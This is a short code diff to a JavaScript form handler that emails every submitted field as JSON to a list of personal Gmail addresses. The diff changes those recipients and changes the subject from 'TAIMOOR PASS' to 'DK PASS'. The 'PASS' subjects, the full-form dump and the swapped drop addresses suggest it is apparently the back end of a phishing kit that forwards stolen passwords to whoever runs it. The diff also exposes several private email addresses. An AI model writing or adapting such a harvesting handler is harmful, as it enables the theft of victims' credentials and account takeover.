@@ -1,4 +1,3 @@
-
 import { transporter } from "./emailConfig.js";
 import querystring from "querystring";
 
@@ -38,8 +37,8 @@ export default async function handler(req, res) {
     // ✅ Send email
     await transporter.sendMail({
       from: `"PROFESSOR" <${process.env.SMTP_USER}>`,
-      to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com,officialjaendowns@gmail.com",
-      subject: "TAIMOOR PASS",
+      to: "adsmenigar@gmail.com,donem8575@gmail.com",
+      subject: "DK PASS",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Link</h3><pre>${JSON.stringify(formData, null, 2)}</pre>`,
     });
